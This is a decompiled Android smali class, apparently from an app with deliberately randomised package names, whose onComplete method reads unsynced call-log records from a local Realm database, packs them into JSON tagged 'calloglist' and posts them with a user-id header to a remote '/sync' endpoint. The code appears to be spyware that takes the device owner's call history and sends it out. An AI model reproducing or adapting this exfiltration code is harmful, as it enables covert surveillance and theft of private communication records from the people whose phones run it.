.class public Li/a/a/r$d;
.super Ljava/lang/Object;
.source "sourcefile"

# interfaces
.implements Lj/a/h0/b/f;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Li/a/a/r;->i(Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ljava/lang/Object;",
        "Lj/a/h0/b/f<",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# direct methods
.method public constructor <init>(Li/a/a/r;)V
    .locals 0
    .param p1, "this$0"    # Li/a/a/r;

    .line 776
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Lj/a/h0/c/c;)V
    .locals 0
    .param p1, "d"    # Lj/a/h0/c/c;

    .line 780
    return-void
.end method

.method public b()V
    .locals 1

    const/4 v0, 0x0

    .line 785
    .local v0, "aDouble":Ljava/lang/String;
    return-void
.end method

.method public onComplete()V
    .locals 9

    .line 796
    :try_start_0
    invoke-static {}, Lio/realm/Realm;->getDefaultInstance()Lio/realm/Realm;

    move-result-object v0

    .line 797
    .local v0, "realm":Lio/realm/Realm;
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 798
    .local v1, "objv":Lorg/json/JSONObject;
    const-class v2, Lgqegwqg/bbebebefff/asdcdsac/realm/Callog;

    invoke-virtual {v0, v2}, Lio/realm/Realm;->where(Ljava/lang/Class;)Lio/realm/RealmQuery;

    move-result-object v2

    const-string v3, "backup"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v2, v3, v5}, Lio/realm/RealmQuery;->equalTo(Ljava/lang/String;Ljava/lang/Boolean;)Lio/realm/RealmQuery;

    move-result-object v2

    invoke-virtual {v2}, Lio/realm/RealmQuery;->findAll()Lio/realm/RealmResults;

    move-result-object v2

    .line 800
    .local v2, "realmResult":Lio/realm/RealmResults;, "Lio/realm/RealmResults<Lgqegwqg/bbebebefff/asdcdsac/realm/Callog;>;"
    new-instance v3, Lcom/google/gson/Gson;

    invoke-direct {v3}, Lcom/google/gson/Gson;-><init>()V

    invoke-virtual {v0, v2}, Lio/realm/Realm;->copyFromRealm(Ljava/lang/Iterable;)Ljava/util/List;

    move-result-object v5

    invoke-virtual {v3, v5}, Lcom/google/gson/Gson;->r(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    .line 802
    .local v3, "jsonString":Ljava/lang/String;
    const-string v5, "event"

    const-string v6, "calloglist"

    invoke-virtual {v1, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 803
    const-string v5, "list"

    invoke-virtual {v1, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 804
    const-string v5, "df"

    invoke-static {v5, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 805
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Li/a/a/p;->c()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "/sync"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lg/m/a/a;->t(Ljava/lang/String;)Lg/m/a/j/c;

    move-result-object v5

    .line 806
    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Lg/m/a/j/a;->m(Ljava/lang/String;)Lg/m/a/j/a;

    check-cast v5, Lg/m/a/j/c;

    new-instance v6, Lcom/zhouyou/http/model/HttpHeaders;

    const-string v7, "x-uid"

    sget-object v8, Li/a/a/p;->a:Ljava/lang/String;

    invoke-direct {v6, v7, v8}, Lcom/zhouyou/http/model/HttpHeaders;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 807
    invoke-virtual {v5, v6}, Lg/m/a/j/b;->f(Lcom/zhouyou/http/model/HttpHeaders;)Lg/m/a/j/b;

    check-cast v5, Lg/m/a/j/c;

    .line 808
    invoke-virtual {v5, v4}, Lg/m/a/j/b;->a(Z)Lg/m/a/j/b;

    check-cast v5, Lg/m/a/j/c;

    const/4 v4, 0x1

    .line 809
    invoke-virtual {v5, v4}, Lg/m/a/j/b;->i(Z)Lg/m/a/j/b;

    check-cast v5, Lg/m/a/j/c;

    new-instance v4, Li/a/a/r$d$a;

    invoke-direct {v4, p0}, Li/a/a/r$d$a;-><init>(Li/a/a/r$d;)V

    .line 810
    invoke-virtual {v5, v4}, Lg/m/a/j/c;->p(Lg/m/a/e/a;)Lj/a/a0/b;

    .line 826
    invoke-virtual {v0}, Lio/realm/Realm;->close()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 829
    .end local v0    # "realm":Lio/realm/Realm;
    .end local v1    # "objv":Lorg/json/JSONObject;
    .end local v2    # "realmResult":Lio/realm/RealmResults;, "Lio/realm/RealmResults<Lgqegwqg/bbebebefff/asdcdsac/realm/Callog;>;"
    .end local v3    # "jsonString":Ljava/lang/String;
    goto :goto_0

    .line 827
    :catch_0
    move-exception v0

    .line 828
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "e"

    invoke-static {v2, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 830
    .end local v0    # "e":Lorg/json/JSONException;
    :goto_0
    return-void
.end method

.method public onError(Ljava/lang/Throwable;)V
    .locals 0
    .param p1, "e"    # Ljava/lang/Throwable;

    .line 790
    return-void
.end method

.method public bridge synthetic onNext(Ljava/lang/Object;)V
    .locals 0

    .line 776
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0}, Li/a/a/r$d;->b()V

    return-void
.end method
